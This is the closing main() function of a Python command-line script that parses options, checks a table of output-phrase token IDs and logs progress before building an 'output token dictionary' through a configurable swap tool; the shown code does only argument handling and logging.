def main() -> None:
    p = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    p.add_argument("--build", action="store_true",
                   help="Pre-build output token dictionary then exit")
    p.add_argument("--print-phrase-ids", action="store_true",
                   help="Print token IDs for OUTPUT_PHRASES and ready-to-paste labels (run on guest)")
    p.add_argument("--swap-tool",  default=str(SWAP_TOOL))
    p.add_argument("--log-file",   default=None,
                   help="Append all log output to this file")
    args = p.parse_args()

    if args.print_phrase_ids:
        print_phrase_ids()
        return

    if not args.build:
        p.error("--build or --print-token-ids required")

    global _log_fh
    if args.log_file:
        _log_fh = open(args.log_file, "a")
        log(f"=== session start  log -> {args.log_file} ===")

    empty = [label for label, ids in OUTPUT_TOKEN_LABELS if not ids]
    if empty:
        log_err(f"[!] OUTPUT_TOKEN_LABELS has empty token_ids for: {empty}")
        log_err("[!] Run --print-phrase-ids on guest and fill in OUTPUT_TOKEN_LABELS first.")
        sys.exit(1)

    total_phases = sum(len(ids) for _, ids in OUTPUT_TOKEN_LABELS)
    total_sends  = total_phases * 3
    log(f"[build] {len(OUTPUT_TOKEN_LABELS)} phrases  "
        f"{total_phases} phases  ~{total_sends} sends total")
    for i, (label, ids) in enumerate(OUTPUT_TOKEN_LABELS):
        log(f"  [{i}] {label!r}  {len(ids)} tok  ids={ids[:4]}{'...' if len(ids)>4 else ''}")

    build_output_dict(args.swap_tool)

    if _log_fh:
        _log_fh.close()


if __name__ == "__main__":
    main()
